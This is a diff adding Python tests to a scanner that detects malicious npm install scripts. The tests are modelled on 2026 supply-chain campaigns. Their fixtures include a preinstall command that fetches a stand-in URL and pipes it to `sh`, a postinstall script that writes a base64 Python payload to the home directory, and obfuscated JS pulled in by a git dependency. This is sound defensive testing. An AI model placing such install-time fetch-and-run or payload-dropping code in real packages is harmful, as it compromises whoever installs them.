@@ -701,3 +701,64 @@ def test_detached_child_js_is_install_scope():
                "src/postinstall.js": post, "src/main.js": main})
     hi = [x for x in f if x.rule == "npm-install-time-exec"]
     assert hi and hi[0].location.startswith("src/main.js")
+
+
+# ── 탈취 패키지 실측(compromised_lib)에서 놓친 형태 ─────────────────
+
+def test_bun_run_subcommand_followed():
+    # 2026-05 AntV 캠페인: "preinstall": "bun run index.js"
+    js = "require('child_process').exec('curl -s http://x.example/p | sh')"
+    f = _scan({"package.json": _pkg({"preinstall": "bun run index.js"}), "index.js": js})
+    assert "npm-install-time-exec" in _high(f)
+
+
+def _b64(text: str) -> str:
+    import base64
+    return base64.b64encode(text.encode()).decode()
+
+
+def test_install_script_with_embedded_script_payload():
+    # 2026-03 @emilgroup 캠페인: postinstall 이 base64 로 든 파이썬 스크립트를 디스크에 쓴다
+    payload = _b64("import urllib.request\nimport os\nimport subprocess\n" + "x = 1\n" * 40)
+    js = f"""
+    const fs = require('fs'); const os = require('os'); const path = require('path');
+    const P = '{payload}';
+    fs.writeFileSync(path.join(os.homedir(), '.svc.py'), Buffer.from(P, 'base64'));
+    """
+    f = _scan({"package.json": _pkg({"postinstall": "node index.js"}), "index.js": js})
+    assert "npm-decode-exec" in _high(f)
+
+
+def test_embedded_base64_data_is_not_payload():
+    # 설치 스크립트가 든 base64 가 스크립트가 아니면(이미지·설정) 걸지 않는다
+    blob = _b64("lorem ipsum dolor sit amet, " * 20)
+    js = f"const logo = '{blob}'; console.log(logo.length);"
+    f = _scan({"package.json": _pkg({"postinstall": "node index.js"}), "index.js": js})
+    assert not _high(f)
+
+
+def _obfuscated_js(n: int = 60) -> str:
+    return ";".join(f"var _0x{i:04x}a=_0x{i + 1:04x}b(0x{i:x})" for i in range(n))
+
+
+def test_unreferenced_obfuscated_file_with_git_dependency():
+    # 2026-05 TanStack 캠페인: optionalDependencies 의 git 저장소가 설치 때 이 파일을 실행
+    pkg = json.loads(_pkg())
+    pkg["optionalDependencies"] = {"@acme/setup": "github:acme/widget#79ac49eedf774dd4b0cf"}
+    f = _scan({"package.json": json.dumps(pkg), "index.js": "module.exports = {}",
+               "router_init.js": _obfuscated_js()})
+    assert "npm-obfuscated" in _high(f)
+
+
+def test_unreferenced_obfuscated_file_alone_stays_medium():
+    f = _scan({"package.json": _pkg(), "index.js": "module.exports = {}",
+               "extra.js": _obfuscated_js()})
+    assert not _high(f)
+    assert "npm-obfuscated" in {x.rule for x in f}
+
+
+def test_git_dependency_alone_stays_low():
+    pkg = json.loads(_pkg())
+    pkg["dependencies"] = {"w": "github:acme/widget"}
+    f = _scan({"package.json": json.dumps(pkg), "index.js": "module.exports = {}"})
+    assert not _high(f)
